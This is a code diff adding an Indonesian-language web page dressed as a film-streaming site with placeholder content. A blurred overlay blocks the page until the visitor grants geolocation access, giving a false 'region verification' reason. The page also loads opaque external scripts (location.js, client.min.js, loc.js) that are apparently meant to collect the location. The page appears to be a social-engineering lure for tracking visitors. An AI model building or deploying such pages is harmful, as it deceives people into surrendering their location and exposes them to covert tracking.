@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Streaming Online - Halaman Nonton</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #141414;
+            color: white;
+        }
+        header {
+            background-color: #000;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        header .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e50914;
+        }
+        header .search {
+            flex: 1;
+            margin: 0 20px;
+        }
+        header input {
+            width: 100%;
+            padding: 8px;
+            border: none;
+            border-radius: 4px;
+        }
+        nav {
+            display: flex;
+            gap: 20px;
+        }
+        nav a {
+            color: white;
+            text-decoration: none;
+        }
+        .container {
+            display: flex;
+            min-height: 80vh;
+        }
+        .main {
+            flex: 3;
+            padding: 20px;
+        }
+        .video-player {
+            background-color: #000;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .video-player video {
+            width: 100%;
+            height: auto;
+        }
+        .video-info {
+            padding: 10px;
+        }
+        .sidebar {
+            flex: 1;
+            padding: 20px;
+            background-color: #222;
+            border-left: 1px solid #333;
+        }
+        .recommendation {
+            margin-bottom: 20px;
+        }
+        .recommendation img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            border-radius: 4px;
+        }
+        .recommendation h4 {
+            margin: 10px 0 5px;
+            font-size: 16px;
+        }
+        footer {
+            background-color: #000;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        /* Overlay untuk blur dan pesan akses lokasi */
+        #location-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+        }
+        #location-overlay.hidden {
+            display: none;
+        }
+        #location-overlay .message {
+            max-width: 400px;
+            padding: 20px;
+            background-color: #333;
+            border-radius: 8px;
+        }
+        #location-overlay button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #e50914;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            .sidebar {
+                border-left: none;
+                border-top: 1px solid #333;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Overlay untuk akses lokasi -->
+    <div id="location-overlay">
+        <div class="message">
+            <h2>Akses Lokasi Diperlukan</h2>
+            <p>Untuk memverifikasi region Anda dan memastikan layanan tersedia, izinkan akses lokasi terlebih dahulu.</p>
+            <button onclick="requestLocation()">Izinkan Akses Lokasi</button>
+        </div>
+    </div>
+
+    <header>
+        <div class="logo">StreamOnline</div>
+        <div class="search">
+            <input type="text" placeholder="Cari film atau serial...">
+        </div>
+        <nav>
+            <a href="#">Beranda</a>
+            <a href="#">Kategori</a>
+            <a href="#">Akun</a>
+        </nav>
+    </header>
+
+    <div class="container">
+        <div class="main">
+            <div class="video-player">
+                <video controls>
+                    <source src="https://sample-videos.com/zip/10/mp4/SampleVideo_1280x720_1mb.mp4" type="video/mp4">
+                    Browser Anda tidak mendukung video tag.
+                </video>
+            </div>
+            <div class="video-info">
+                <h2>Judul Film: Avengers: Endgame</h2>
+                <p>Deskripsi: Film superhero epik di mana para pahlawan berjuang melawan Thanos. (Dummy content)</p>
+                <p>Durasi: 3 jam 2 menit | Rating: 9.2/10</p>
+            </div>
+        </div>
+
+        <div class="sidebar">
+            <h3>Rekomendasi Lainnya</h3>
+            <div class="recommendation">
+                <img src="https://picsum.photos/300/200?random=1" alt="Dummy Gambar 1">
+                <h4>Film 1: Inception</h4>
+                <p>Thriller sci-fi tentang mimpi dalam mimpi.</p>
+            </div>
+            <div class="recommendation">
+                <img src="https://picsum.photos/300/200?random=2" alt="Dummy Gambar 2">
+                <h4>Film 2: The Dark Knight</h4>
+                <p>Action dengan Batman melawan Joker.</p>
+            </div>
+            <div class="recommendation">
+                <img src="https://picsum.photos/300/200?random=3" alt="Dummy Gambar 3">
+                <h4>Film 3: Interstellar</h4>
+                <p>Petualangan luar angkasa untuk menyelamatkan umat manusia.</p>
+            </div>
+            <div class="recommendation">
+                <img src="https://picsum.photos/300/200?random=4" alt="Dummy Gambar 4">
+                <h4>Film 4: Parasite</h4>
+                <p>Thriller sosial tentang kelas sosial.</p>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2023 StreamOnline. Semua hak dilindungi.</p>
+    </footer>
+
+    <!-- Script tambahan dari user -->
+    <script src="../../assets/js/location.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+
+    <script>
+        // Fungsi untuk cek permission lokasi dengan fallback
+        function checkLocationPermission() {
+            if (navigator.permissions) {
+                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                    console.log('Permission state:', result.state); // Debug: cek state di console
+                    if (result.state === 'granted') {
+                        // Sudah allow, hide overlay
+                        document.getElementById('location-overlay').classList.add('hidden');
+                    } else {
+                        // Belum allow atau denied, show overlay
+                        document.getElementById('location-overlay').classList.remove('hidden');
+                    }
+                }).catch(function(error) {
+                    console.log('Error querying permission:', error); // Debug
+                    // Fallback: coba getCurrentPosition tanpa prompt
+                    tryGetLocation();
+                });
+            } else {
+                console.log('Permissions API not supported'); // Debug
+                // Fallback: coba getCurrentPosition
+                tryGetLocation();
+            }
+        }
+
+        // Fallback: Coba getCurrentPosition dengan timeout pendek untuk cek tanpa prompt lama
+        function tryGetLocation() {
+            if (navigator.geolocation) {
+                const timeoutId = setTimeout(() => {
+                    console.log('Location request timed out, showing overlay'); // Debug
+                    document.getElementById('location-overlay').classList.remove('hidden');
+                }, 1000); // Timeout 1 detik
+
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        clearTimeout(timeoutId);
+                        console.log('Location granted via fallback, hiding overlay'); // Debug
+                        document.getElementById('location-overlay').classList.add('hidden');
+                    },
+                    function(error) {
+                        clearTimeout(timeoutId);
+                        console.log('Location denied via fallback, showing overlay:', error); // Debug
+                        document.getElementById('location-overlay').classList.remove('hidden');
+                    },
+                    { timeout: 1000 } // Timeout untuk request
+                );
+            } else {
+                console.log('Geolocation not supported'); // Debug
+                document.getElementById('location-overlay').classList.remove('hidden');
+            }
+        }
+
+        // Fungsi untuk request akses lokasi
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        console.log('Location allowed via button, hiding overlay'); // Debug
+                        document.getElementById('location-overlay').classList.add('hidden');
+                    },
+                    function(error) {
+                        console.log('Location denied via button:', error); // Debug
+                        alert("Akses lokasi ditolak. Izinkan akses untuk melanjutkan.");
+                        document.getElementById('location-overlay').classList.remove('hidden');
+                    }
+                );
+            } else {
+                alert("Browser Anda tidak mendukung geolocation.");
+            }
+        }
+
+        // Cek permission saat halaman load
+        window.onload = checkLocationPermission;
+
+        // Script sederhana untuk demo: Klik gambar rekomendasi untuk "nonton" (alert dummy)
+        document.querySelectorAll('.recommendation img').forEach(img => {
+            img.addEventListener('click', () => {
+                alert('Memuat video: ' + img.nextElementSibling.textContent);
+            });
+        });
+    </script>
+</body>
+</html>
